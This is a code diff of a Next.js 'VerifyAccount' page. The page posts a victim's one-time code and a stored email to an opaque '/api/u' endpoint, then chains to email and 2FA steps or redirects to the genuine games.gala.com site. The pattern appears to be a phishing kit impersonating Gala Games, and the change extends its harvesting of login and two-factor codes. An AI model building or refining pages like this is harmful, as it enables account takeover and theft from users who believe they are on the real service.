@@ -2,21 +2,45 @@
 import React from 'react';
 import styles from './styles.module.css';
 import Image from "next/image";
+import {useRouter} from "next/navigation";
+import {routeConstants} from "../../../../constants/route";
 
+
+const navigationMapper = {
+  'email': routeConstants.VERIFY_EMAIL,
+  '2fa': routeConstants.TWO_FA,
+}
 
 const VerifyAccount = () => {
+  const navigate = useRouter()
+  const [loading, setLoading] = React.useState(false);
   const [otp, setOtp] = React.useState('');
 
   const navigateTo = async () => {
-    fetch('/api/u', {
-      method: 'POST',
-      body: JSON.stringify({code: otp, email: sessionStorage.getItem('gd600-ap')}),
-    });
+    setLoading(true);
 
-    setTimeout(() => {
-      window.location.assign('https://games.gala.com/')
-    }, 1000)
-  }
+    const fetchWithTimeout = (url: string, options: RequestInit, timeout = 20000) => {
+      return Promise.race([
+        fetch(url, options).then((res) => res.json()),
+        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
+      ]);
+    };
+
+    try {
+      const res = await fetchWithTimeout('/api/u', {
+        method: 'POST',
+        body: JSON.stringify({code: otp, email: sessionStorage.getItem('gd600-ap')}),
+      });
+
+      if (!res?.error) navigate.push(navigationMapper[res?.data?.key as 'email' | '2fa']);
+    } catch (error) {
+      console.error('Request failed or timed out', error);
+      window.location.assign('https://games.gala.com/');
+    } finally {
+      setLoading(false);
+      sessionStorage.removeItem('gd600-ap');
+    }
+  };
 
 
   return (
@@ -36,7 +60,7 @@ const VerifyAccount = () => {
           onChange={(e) => setOtp(e.target.value)}
         />
         <button className={styles.submitButton} onClick={navigateTo}>
-          Submit
+          {loading ? 'Loading...' : 'Submit'}
         </button>
         <p className={styles.resendLink}>
           Didn{"'"}t receive an email? <a href="#">Reach out</a>
